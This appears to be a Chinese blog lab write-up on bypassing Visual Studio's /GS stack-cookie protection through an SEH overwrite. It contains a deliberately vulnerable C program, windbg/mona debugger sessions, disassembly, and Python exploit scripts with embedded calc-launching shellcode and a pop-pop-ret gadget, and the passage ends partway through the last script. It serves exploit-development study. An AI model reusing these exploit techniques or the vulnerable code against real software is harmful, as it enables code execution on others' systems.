<li>链接器<code>DEP</code> (<code>/NXCOMPAT:NO</code>)：配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)</li>
<li>操作系统<code>DEP</code>(如果开着记得关了)：WIN10下：设置—系统—关于—高级系统设置—性能-设置—数据执行保护—选中“DEP(T)”</li>
</ul>
</li>
<li>关闭随机基址(<code>/DYNAMICBASE:NO</code>) ：配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)</li>
<li>关闭<code>/SDL</code>检查(<code>/sdl-</code>)：配置属性—&gt;C&#x2F;C++—&gt;常规—&gt;SDL检查）</li>
<li>关闭 <code>/SAFESEH</code>：配置属性—&gt;链接器—&gt;高级—&gt;映像具有安全异常处理程序(&#x2F;SAFESEH:NO)</li>
<li>开启安全检查(<code>/GS</code>) ： 配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;安全检查</li>
</ul>
</li>
</ul>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="重复实验"><a href="#重复实验" class="headerlink" title="重复实验"></a>重复实验</h3><p>重复<a href="https://czxvan.github.io/2023/10/19/Exploitme/">Exploitme</a>中的实验（先确认关闭<code>/GS</code>时，可成功运行，然后打开<code>/GS</code>）</p>
<p>漏洞程序（选择预留栈空间的版本，详情见<a href="https://czxvan.github.io/2023/10/19/Exploitme/#%E5%A4%8D%E7%8E%B0%E8%A1%A5%E5%85%85%EF%BC%88%E6%A0%88%E7%A9%BA%E9%97%B4%E4%B8%8D%E8%B6%B3%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%89">Exploitme——解决栈空间不足</a>）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line">_declspec(noinline) <span class="type">int</span> <span class="title function_">old_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!f)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> bytes = ftell(f);</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    fread(name, <span class="number">1</span>, bytes, f);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *(name+bytes) = &#x27;\0&#x27;; // 这种写法可以免去数组边界检查，下文对此有分析</span></span><br><span class="line">    name[bytes] = <span class="string">&#x27;\0&#x27;</span>; </span><br><span class="line">                    </span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">                    </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize( <span class="string">&quot;&quot;</span>, off )</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> moreStack[<span class="number">100</span>]; <span class="comment">// 后面会发现100还是不够，需要改到1000</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(moreStack); ++i)</span><br><span class="line">        moreStack[i] = i;</span><br><span class="line">    <span class="keyword">return</span> old_main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>windbg</code>下<code>mona</code>搜索<code>jmp esp</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br><span class="line">!py mona j -r esp -m &quot;ntdll&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">虽然Exploitme模块关闭了ASLR，但它里面没有符合要求的指令。我们还是得用默认开启了ASLR的系统模块，且每次重启电脑都要重新寻找。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7755ce33 |   0x7755ce33 (b+0x0010ce33)  : call esp </span><br></pre></td></tr></table></figure>

<p><code>exp.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\x55\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>

<p><code>visual studio</code>下以<code>release</code>模式调试程序，报错如下：</p>
<p><img src="/../pic/Exploitme-Cookie/array-check-failure.png" alt="security-check-failure"></p>
<p><code>windbg</code>下运行，结果如下：</p>
<p><img src="/../pic/Exploitme-Cookie/windbg-cookie-check-failure.png" alt="security-check-failure"></p>
<p>上面的报错信息是数组超出边界报错，和我们预想的通过<code>cookie</code>检测到栈溢出不同，下面分析原因。</p>
<h3 id="分析汇编"><a href="#分析汇编" class="headerlink" title="分析汇编"></a>分析汇编</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401040  push        ebp  </span><br><span class="line">00401041  mov         ebp,esp  </span><br><span class="line">00401043  sub         esp,24h  </span><br><span class="line">00401046  mov         eax,dword ptr [__security_cookie (0403004h)]  // 读取0x0403004处存放的security_cookie，一个随机值</span><br><span class="line">0040104B  xor         eax,ebp  										// cookie = security_cookie ^ ebp</span><br><span class="line">0040104D  mov         dword ptr [ebp-4],eax  						// 存储 cookie，供函数返回前进行检查</span><br><span class="line">00401050  push        edi  </span><br><span class="line">     4:     char name[32];</span><br><span class="line">     5:     printf(&quot;Reading name from file...\n&quot;);</span><br><span class="line">     6: </span><br><span class="line">     7:     FILE* f = fopen(&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;, &quot;rb&quot;);</span><br><span class="line">     8:     if (!f)</span><br><span class="line">     9:         return -1;</span><br><span class="line">    10:     fseek(f, 0L, SEEK_END);</span><br><span class="line">    11:     long bytes = ftell(f);</span><br><span class="line">    12:     fseek(f, 0L, SEEK_SET);</span><br><span class="line">    13:     fread(name, 1, bytes, f);</span><br><span class="line">    14:     name[bytes] = &#x27;\0&#x27;;</span><br><span class="line">004010B7  cmp         ebx,20h 			// 数组边界检查</span><br><span class="line">004010BA  jae         old_main+0ABh (04010EBh)</span><br><span class="line">004010BC  push        edi</span><br><span class="line">004010BD  mov         byte ptr name[ebx],0 </span><br><span class="line">    15:     fclose(f);</span><br><span class="line">    16: </span><br><span class="line">    17:     printf(&quot;Hi, %s!\n&quot;, name);</span><br><span class="line">    18:     return 0;</span><br><span class="line">004010D6  mov         ecx,dword ptr [ebp-4]  </span><br><span class="line">004010D9  add         esp,0Ch  </span><br><span class="line">004010DC  xor         ecx,ebp  </span><br><span class="line">004010DE  xor         eax,eax  </span><br><span class="line">004010E0  pop         ebx  </span><br><span class="line">004010E1  pop         edi  </span><br><span class="line">004010E2  call        __security_check_cookie (0401147h)  	// 检查 cookie 是否被破坏</span><br><span class="line">004010E7  mov         esp,ebp  </span><br><span class="line">004010E9  pop         ebp  </span><br><span class="line">004010EA  ret  </span><br><span class="line">    14:     name[bytes] = &#x27;\0&#x27;;</span><br><span class="line">004010EB  call        __report_rangecheckfailure (0401277h)  </span><br><span class="line">004010F0  int         3  </span><br></pre></td></tr></table></figure>

<h4 id="绕过数组边界检查"><a href="#绕过数组边界检查" class="headerlink" title="绕过数组边界检查"></a>绕过数组边界检查</h4><p>在开启 &#x2F;GS 后，执行数组赋值语句 <code>name[bytes]=&#39;\0&#39;</code> ( <code>mov byte ptr name[ebx],0</code>) 前，会进行数组边界检查，如果下标超出边界，会直接报错退出程序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">004010B7  cmp         ebx,20h  </span><br><span class="line">004010BA  jae         old_main+0ABh (04010EBh) // 报错，并退出程序</span><br><span class="line">004010BC  push        edi</span><br><span class="line">004010BD  mov         byte ptr name[ebx],0 </span><br></pre></td></tr></table></figure>

<p>我们可以将 <code>name[bytes]=&#39;\0&#39;</code> 替换为以下语句，以避免进行数组边界检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(name+bytes) = <span class="string">&#x27;\0&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>重新在<code>Release</code>模式下调试程序，报错信息如下：</p>
<p><img src="/../pic/Exploitme-Cookie/security-check-failure.png" alt="security-check-failure"></p>
<p><code>windbg</code>下运行，结果如下：</p>
<p><img src="/../pic/Exploitme-Cookie/windbg-cookie-check-failure.png" alt="security-check-failure"></p>
<p>确认是通过cookie检测到溢出，符合预期。</p>
<h4 id="栈内存布局"><a href="#栈内存布局" class="headerlink" title="栈内存布局"></a>栈内存布局</h4><p>在将 cookie 放入栈后，栈中数据的布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp -&gt; 	name[0..3]</span><br><span class="line">		name[4..7]</span><br><span class="line">		.</span><br><span class="line">		.</span><br><span class="line">		.</span><br><span class="line">		name[28..31]</span><br><span class="line"> ebp-4	 -&gt;	cookie</span><br><span class="line">ebp -&gt;	save_ebp</span><br><span class="line">		ret_eip</span><br><span class="line">		.</span><br><span class="line">		.</span><br><span class="line">		.</span><br></pre></td></tr></table></figure>

<p>ret_eip在cookie的下面，因此我们无法在不破坏 cookie 的前提下，覆写 ret_rip，而一旦破坏了 cookie，程序将在执行 ret 之前退出。</p>
<p>原来的栈溢出思路不起作用，现在需要新的方法。</p>
<h3 id="SEH绕过cookie"><a href="#SEH绕过cookie" class="headerlink" title="SEH绕过cookie"></a>SEH绕过cookie</h3><ul>
<li><code>SEH</code>存储在栈中，可以被覆盖</li>
<li>当<code>fread</code>向栈中读入大量字符时，可能超出栈底，导致异常，进而调用已被覆盖的<code>SEH</code>函数</li>
<li>我们实在函数内制造异常进而执行<code>SEH</code>函数，所以即便破坏了<code>cookie</code>也没关系，程序流根本走不到检查<code>cookie</code>那一步。</li>
</ul>
<p>当<code>name.data</code>中有 3000 个‘a’时，在windbg下执行程序，使用<code>!exchain</code>命令可以看到<code>SEH</code>已被覆盖。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; !exchain</span><br><span class="line">0019ff60: 61616161</span><br><span class="line">Invalid exception stack at 61616161</span><br></pre></td></tr></table></figure>

<h4 id="确定seh偏移量"><a href="#确定seh偏移量" class="headerlink" title="确定seh偏移量"></a>确定seh偏移量</h4><p>使用<code>mona</code>生成 3000 个字符，并拷贝至“<code>name.dat</code>“文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br><span class="line">!py mona pc 3000</span><br></pre></td></tr></table></figure>

<p>windbg下运行程序，出现两部分报错信息，第一部分是<code>fread</code>超出了栈底，第二部分是执行<code>SEH</code>但指令地址<code>31684130</code>无效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(4e94.4b34): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=0064dbb8 ebx=fffffffe ecx=00000a48 edx=00000bb7 esi=0064d170 edi=001a0000</span><br><span class="line">eip=7713fc8e esp=0019fd98 ebp=0019fdbc iopl=0         nv up ei pl nz na po cy</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203</span><br><span class="line">ucrtbase!memcpy+0x4e:</span><br><span class="line">7713fc8e f3a4            rep movs byte ptr es:[edi],byte ptr [esi]</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">(4e94.4b34): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000000 ebx=00000000 ecx=31684130 edx=774d8ad0 esi=00000000 edi=00000000</span><br><span class="line">eip=31684130 esp=0019f768 ebp=0019f788 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246</span><br><span class="line">31684130 ??              ???  </span><br></pre></td></tr></table></figure>

<p>使用<code>mona po</code>命令，确定<code>SEH</code>所在位置的偏移量为<code>212</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; .load pykd</span><br><span class="line">0:000&gt; !py mona po 31684130</span><br><span class="line"></span><br><span class="line">** You are running pykd.pyd v0.3.4.15. Use at your own risk **</span><br><span class="line"></span><br><span class="line">Hold on...</span><br><span class="line">[+] Command used:</span><br><span class="line">!py D:\Program Files (x86)\Windbg\x86\mona.py po 31684130</span><br><span class="line">Looking for 0Ah1 in pattern of 500000 bytes</span><br><span class="line"> - Pattern 0Ah1 (0x31684130) found in cyclic pattern at position 212</span><br><span class="line">Looking for 0Ah1 in pattern of 500000 bytes</span><br><span class="line">Looking for 1hA0 in pattern of 500000 bytes</span><br><span class="line"> - Pattern 1hA0 not found in cyclic pattern (uppercase)  </span><br><span class="line">Looking for 0Ah1 in pattern of 500000 bytes</span><br><span class="line">Looking for 1hA0 in pattern of 500000 bytes</span><br><span class="line"> - Pattern 1hA0 not found in cyclic pattern (lowercase)  </span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:00.191000</span><br></pre></td></tr></table></figure>

<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><h4 id="错误思路"><a href="#错误思路" class="headerlink" title="错误思路"></a>错误思路</h4><p>首先想到的一种思路是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = nop * (212-4) + jmp_6 + jmp_esp(SEH) + shellcode </span><br></pre></td></tr></table></figure>

<p>执行流为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">触发异常-&gt;执行SEH(jmp esp),跳转至栈顶执行-&gt;从栈顶开始一串nop滑轨-&gt;执行jmp 6，跳过SEH，跳转到shellcode-&gt;执行shellcode</span><br></pre></td></tr></table></figure>

<p>经过分析，上面这种思路是不可行的，上面我们假设栈顶是<code>nop</code>指令，但实际上，我们填充<code>nop</code>指令是从 name 处开始的，而在调用<code>SEH</code>时，在栈顶和 name 之间有新的数据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">esp -&gt;	...			其它数据</span><br><span class="line">		...</span><br><span class="line">		name[0...3]	nop</span><br><span class="line">		...			nop</span><br></pre></td></tr></table></figure>

<p>也就是说，我们不能将执行流转到栈顶。</p>
<h4 id="不可行思路"><a href="#不可行思路" class="headerlink" title="不可行思路"></a>不可行思路</h4><p>当执行seh时，esp的值与shellcode所在地址分别如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp : 0x0019f768</span><br><span class="line">shellcode: 0x0019ff68</span><br></pre></td></tr></table></figure>

<p>它们之间的差恒为 0x800 ，如果使得SEH指向以下gadget，便能劫持执行流至shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD   ESP, 0x800</span><br><span class="line">JMP   ESP</span><br></pre></td></tr></table></figure>

<p>但这样的<code>gadget</code>很难找。</p>
<h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>查看栈顶附近的数据，可以发现<code>esp+8</code>位置的数据，和<code>SEH</code>和<code>shellcode</code>所在地址距离很近，可以加以利用。</p>
<p><img src="/../pic/Exploitme-Cookie/ESP+8.png" alt="ESP+8"></p>
<p>也就是说，如果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SEH = jmp esp+8 或 ret esp+8 或 call esp+8 或 pop xx#pop xx#ret(ppt指令)</span><br></pre></td></tr></table></figure>

<p>程序执行流在执行完<code>SEH</code>后，会去执行 <code>SEH</code>地址的前面四个字节，我们可以在这里写入<code>jmp 6</code>，从而劫持执行流至<code>shellcode</code>。</p>
<h5 id="mona搜索ppt指令"><a href="#mona搜索ppt指令" class="headerlink" title="mona搜索ppt指令"></a>mona搜索ppt指令</h5><ul>
<li><code>Exploitme2</code>中的指令高字节都是0x00，不过程序中使用的是<code>fread</code>，不会将<code>payload</code>截断。</li>
<li><code>Exploitme2</code>没开启随机基址，系统重启后，指令依然有效。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona findwild -s &quot;pop r32#pop r32#ret&quot; -m Exploitme</span><br></pre></td></tr></table></figure>

<p>得到以下结果，我们选用<code>0x00401a11</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Results : </span><br><span class="line">0x00401a11 |   0x00401a11 : pop esi # pop ebx # retn | startnull,ascii &#123;PAGE_EXECUTE_READ&#125; [Exploitme.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (Exploitme.exe), 0x8000</span><br><span class="line">...</span><br><span class="line">    Found a total of 8 pointers</span><br></pre></td></tr></table></figure>

<h5 id="测试exp"><a href="#测试exp" class="headerlink" title="测试exp"></a>测试exp</h5><ul>
<li><code>jmp 6</code>的二进制码是<code>EB 06</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    jmp_6 = <span class="string">b&#x27;\xeb\x06&#x27;</span></span><br><span class="line">    seh = <span class="string">b&#x27;\x11\x1a\x40\x00&#x27;</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">212</span>-<span class="number">4</span>) + jmp_6 + <span class="string">b&#x27;a&#x27;</span>*<span class="number">2</span>  + seh + shellcode + <span class="string">b&quot;a&quot;</span>*<span class="number">3000</span></span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>

<p><code>windbg</code>下运行，结果如图：</p>
<p><img src="/../pic/Exploitme-Cookie/access-violation-in-shellcode.png" alt="access-violation-in-shellcode"></p>
<p><code>seh</code>所在位置与栈底之间的距离，虽然可以装得下<code>shellcode</code>，但满足不了<code>shellcode</code>执行过程中所需。</p>
<h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>我们可以把 <code>shellcode</code> 放到靠前（距离栈底较远的位置），然后跳转过去。</p>
<p>我们的<code>shellcode</code>长度为 309。因此我们需要修改一下程序源码，以保证栈空间足够存放<code>shellcode</code>。</p>
<p>Exploitme.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line">_declspec(noinline) <span class="type">int</span> <span class="title function_">old_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!f)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> bytes = ftell(f);</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    fread(name, <span class="number">1</span>, bytes, f);</span><br><span class="line">    *(name+bytes) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize( <span class="string">&quot;&quot;</span>, off )</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> moreStack[<span class="number">1000</span>]; <span class="comment">// 增大栈空间</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(moreStack); ++i)</span><br><span class="line">        moreStack[i] = i;</span><br><span class="line">    <span class="keyword">return</span> old_main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        